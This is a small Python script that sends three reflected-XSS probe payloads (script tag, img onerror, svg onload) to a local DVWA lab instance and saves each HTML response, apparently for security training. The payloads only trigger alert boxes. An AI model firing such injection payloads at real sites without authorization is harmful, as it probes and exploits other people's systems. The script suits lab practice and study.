#!/usr/bin/env python3
"""
Author: Syed Raihaan
Project: XSS Payload Injector
Description:
  Automates sending XSS payloads to DVWA (Damn Vulnerable Web App) or similar test targets.
  This is for educational purposes only — never test on unauthorized systems.

Usage:
  - Edit TARGET_URL, COOKIES, HEADERS, and PAYLOADS as needed.
  - Run: python payload_injector.py
"""

import requests

# -----------------------------
# Config: Update these for your environment
# -----------------------------

# Example: DVWA running locally in Docker on port 8080
TARGET_URL = "http://127.0.0.1:8080/vulnerabilities/xss_r/"

# Example cookies: adjust PHPSESSID and security level
COOKIES = {
    "PHPSESSID": "your_session_id_here",
    "security": "low"
}

HEADERS = {
    "User-Agent": "Mozilla/5.0 (XSS Injector)",
    "Accept": "text/html,application/xhtml+xml",
    "Referer": TARGET_URL
}

# Example XSS payloads
PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert('XSS')>",
    "\"><svg/onload=alert('Injected!')>"
]

# -----------------------------
# Main logic
# -----------------------------

def send_payload(payload):
    params = {"name": payload}
    print(f"[*] Sending payload: {payload}")
    response = requests.get(TARGET_URL, headers=HEADERS, cookies=COOKIES, params=params)
    return response.text

def main():
    for payload in PAYLOADS:
        html = send_payload(payload)
        filename = f"response_{payload[:5].replace('<','').replace('>','')}.html"
        with open(filename, "w", encoding="utf-8") as f:
            f.write(html)
        print(f"[+] Saved response to {filename}")

if __name__ == "__main__":
    main()
